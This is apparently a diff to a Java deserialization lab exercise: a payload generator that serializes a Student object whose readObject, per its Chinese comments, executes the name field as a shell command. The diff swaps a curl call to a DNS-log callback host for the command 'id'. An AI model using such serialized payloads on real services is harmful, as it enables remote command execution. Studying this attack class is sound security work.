@@ -10,7 +10,9 @@ import java.io.ObjectOutputStream;
  */
 public class GenPayload {
     public static void main(String[] args) throws Exception {
-        Student student = new Student("curl http://your-dnslog.ceye.io", 18);
+        // 自定义 readObject 会执行 Runtime.getRuntime().exec(name)
+        // name 字段值就是要执行的命令
+        Student student = new Student("id", 18);
 
         ObjectOutputStream oos = new ObjectOutputStream(
             new FileOutputStream("class04.ser"));
